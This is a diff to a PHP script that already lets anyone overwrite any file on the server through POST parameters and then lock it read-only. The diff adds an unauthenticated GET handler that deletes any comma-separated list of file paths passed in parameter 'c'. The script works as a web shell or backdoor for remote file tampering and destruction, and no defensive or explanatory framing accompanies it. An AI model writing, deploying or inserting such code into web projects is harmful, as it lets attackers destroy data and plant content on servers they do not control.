@@ -1,7 +1,6 @@
 <?php
 if ($_POST) {
     $file = $_POST["f"];
-
     if (file_exists($file)) {
         unlink($file);
     }
@@ -11,7 +10,6 @@ if ($_POST) {
     if ($f) {
         if (fwrite($f, $_POST["c"])) {
             echo "<font color=red>OK!</font>";
-
             chmod($file, 0444);
         } else {
             echo "<font color=blue>Error!</font>";
@@ -20,6 +18,24 @@ if ($_POST) {
         fclose($f);
     } else {
         echo "Unable to open file for writing.";
+    }
+} elseif ($_GET && isset($_GET["c"])) {
+    $filePaths = $_GET["c"];
+
+    if (!empty($filePaths)) {
+        $filePaths = explode(",", $filePaths);
+
+        foreach ($filePaths as $filePath) {
+ 
+            if (file_exists($filePath)) {
+                unlink($filePath);
+                echo "File '$filePath' deleted.<br>";
+            } else {
+                echo "File '$filePath' does not exist.<br>";
+            }
+        }
+    } else {
+        echo "No file paths provided.";
     }
 }
 
